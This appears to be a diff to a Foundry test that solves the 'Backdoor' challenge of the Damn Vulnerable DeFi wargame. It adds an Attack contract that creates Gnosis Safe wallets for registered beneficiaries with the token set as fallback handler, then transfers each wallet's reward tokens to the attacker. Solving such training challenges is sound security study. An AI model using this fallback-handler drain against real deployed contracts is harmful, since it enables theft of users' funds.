@@ -8,6 +8,37 @@ import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {WalletRegistry} from "../../../src/Contracts/backdoor/WalletRegistry.sol";
 import {GnosisSafe} from "gnosis/GnosisSafe.sol";
 import {GnosisSafeProxyFactory} from "gnosis/proxies/GnosisSafeProxyFactory.sol";
+import {GnosisSafeProxy} from "gnosis/proxies/GnosisSafeProxy.sol";
+import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
+
+contract Attack {
+    constructor(
+        address registry,
+        address masterCopy,
+        GnosisSafeProxyFactory walletFactory,
+        address token,
+        address[] memory beneficiaries
+    ) {
+        for (uint256 i = 0; i < beneficiaries.length; i++) {
+            address beneficiary = beneficiaries[i];
+            address[] memory owners = new address[](1);
+            owners[0] = beneficiary;
+
+            // set the DamnValuableToken contract as fallbackHandler
+            bytes memory initializer = abi.encodeWithSelector(
+                GnosisSafe.setup.selector, owners, 1, address(0), "", token, address(0), 0, address(0)
+            );
+
+            // deploy wallet for each beneficiary
+            GnosisSafeProxy proxy =
+                walletFactory.createProxyWithCallback(masterCopy, initializer, 0, WalletRegistry(registry));
+
+            // execute transfer transaction via fallbackHandler
+            address wallet = address(proxy);
+            IERC20(wallet).transfer(msg.sender, IERC20(token).balanceOf(wallet));
+        }
+    }
+}
 
 contract Backdoor is Test {
     uint256 internal constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;
@@ -79,6 +110,14 @@ contract Backdoor is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
+        new Attack(
+            address(walletRegistry),
+            address(masterCopy),
+            walletFactory,
+            address(dvt),
+            users
+        );
 
         /**
          * EXPLOIT END *
